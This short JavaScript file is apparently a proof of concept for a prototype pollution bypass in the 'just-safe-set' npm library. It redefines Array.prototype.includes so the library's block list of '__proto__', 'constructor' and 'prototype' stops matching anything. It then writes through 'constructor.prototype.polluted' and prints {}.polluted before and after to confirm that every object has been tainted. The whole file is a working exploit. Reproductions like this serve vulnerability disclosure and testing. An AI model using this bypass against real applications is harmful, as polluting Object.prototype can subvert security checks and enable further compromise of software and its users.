Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const justSafeSet = require('just-safe-set');
let obj = {};
console.log({}.polluted);
justSafeSet(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);